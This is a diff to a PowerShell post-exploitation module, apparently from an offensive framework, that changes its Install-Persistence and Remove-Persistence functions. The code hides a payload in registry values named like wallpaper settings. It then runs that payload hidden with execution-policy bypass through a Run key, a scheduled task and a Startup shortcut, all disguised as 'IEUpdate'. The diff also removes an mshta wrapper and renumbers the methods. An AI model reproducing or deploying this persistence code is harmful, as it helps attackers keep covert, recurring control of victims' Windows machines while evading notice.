@@ -4,7 +4,7 @@ Function Install-Persistence
     if (!$Method){$Method=1}
     if ($Method -eq 1) {
         Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$payload"
-        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "mshta vbscript:CreateObject(`"Wscript.Shell`").Run(`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777`",0,true)(window.close)"
+        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
         $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
         $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
         if (($registrykey.IEUpdate) -and ($registrykey2.Wallpaper777)) {
@@ -13,7 +13,7 @@ Function Install-Persistence
         Write-Output "Error installing persistence"
         }
     }
-    if ($Method -eq 3) {
+    if ($Method -eq 2) {
         Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555 -value "$payload"
         $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
         schtasks.exe /create /sc minute /mo 240 /tn "IEUpdate" /tr "powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper555"
@@ -21,7 +21,7 @@ Function Install-Persistence
             Write-Output "Created scheduled task persistence every 4 hours"
         }
     }
-    if ($Method -eq 2) {
+    if ($Method -eq 3) {
         Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666 -value "$payload"
         $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
         $SourceExe = "powershell.exe"
@@ -56,7 +56,7 @@ Function Remove-Persistence
         Write-Output "Error removing persistence, remove registry keys manually!"
         $error.clear()
     }
-    if ($Method -eq 3) {
+    if ($Method -eq 2) {
         schtasks.exe /delete /tn IEUpdate /F
         Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
         $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
@@ -67,7 +67,7 @@ Function Remove-Persistence
             Write-Output "Error removing SchTasks persistence"
         }
     }
-    if ($Method -eq 2) {
+    if ($Method -eq 3) {
         Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
         $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
         Remove-Item "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\IEUpdate.lnk"
